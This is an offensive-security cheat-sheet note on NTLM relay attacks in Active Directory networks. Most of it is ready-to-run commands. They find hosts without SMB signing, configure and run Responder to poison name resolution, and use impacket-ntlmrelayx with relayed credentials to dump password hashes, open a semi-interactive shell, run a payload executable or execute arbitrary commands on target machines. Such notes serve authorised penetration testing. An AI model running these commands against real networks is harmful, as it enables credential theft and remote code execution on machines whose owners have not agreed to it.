---
tags:
  - Initial-Access
  - LLMNR
  - NETBIOS
  - SMB
  - AD
---
[https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)

Relay captures hashes to target machine for various types of access.
- Only works if SMB signing is disabled or "not required"
- Relayed creds MUST be admin on the machine


## Identifying Relay Targets
___
**Automated**

[RunFinger.py](https://github.com/lgandx/Responder/blob/master/tools/RunFinger.py) included with Responder can scan the network for potential relay targets for:

- SMB
- MSSQL
- RDP

```bash
python3 RunFinger.py -i 192.168.1.0/24
```

**NetExec** will automatically generate a list of targets with --gen-relay-list for:

- SMB

```
nxc smb 192.168.1.0/24 --gen-relay-list output.txt
```





## ntlmrelayx
___




## Responder + ntlmrelayx
---

Edit responder conf:
```bash
sudo nano /etc/responder/Responder.conf
SMB = On ---> Off
HTTP = on ---> Off
```
Make targets list
```bash
echo "<TargetIP>" > targets.txt
```
Run responder
```bash
sudo responder -I eth0 -wv
```
Start ntlmrelayx with any of these options

**Dump hashes**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```
**Get semi-interactive smbexec bind shell** (`nc localhost 11000`)
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
**Execute payload**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
```
**Execute Command**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```
Wait for auth attempt (or coerce auth attempt)
